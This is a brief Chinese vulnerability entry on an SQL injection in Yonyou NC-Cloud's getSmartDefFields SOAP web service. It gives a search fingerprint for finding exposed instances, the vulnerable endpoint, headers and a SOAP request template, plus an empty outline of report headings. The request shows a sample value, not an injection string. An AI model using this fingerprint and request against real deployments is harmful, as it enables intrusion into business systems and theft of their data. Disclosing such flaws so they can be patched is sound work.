# 用友-NC-Cloud系统getSmartDefFields存在SQL注入漏洞

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="用友-NC-Cloud"`
- **请求**：`POST /uapws/service/nc.itf.smart.ISmartQueryWebService HTTP/1.1`
- **关键头**：`Cookie: JSESSIONID=0228E626221732545F3EA3725D9F2EC9.ncMem02; JSESSIONID=66E4C3071500C218…`　`SOAPAction: urn:getSmartDefFields`　`Content-Type: text/xml;charset=UTF-8`　`Host: xx.xx.xx.xx`　`Content-Length: 340`

**请求体 / payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ism="http://smart.itf.nc/ISmartQueryWebService">
<soapenv:Header/>
<soapenv:Body>
<ism:getSmartDefFields>
<!--type: string-->
<ism:string>gero et</ism:string>
</ism:getSmartDefFields>
</soapenv:Body>
</soapenv:Envelope>
```

**其他**
- 用友-NC-Cloud系统getSmartDefFields存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
  * 四、漏洞复现
***
- 版本: * 用友NC Cloud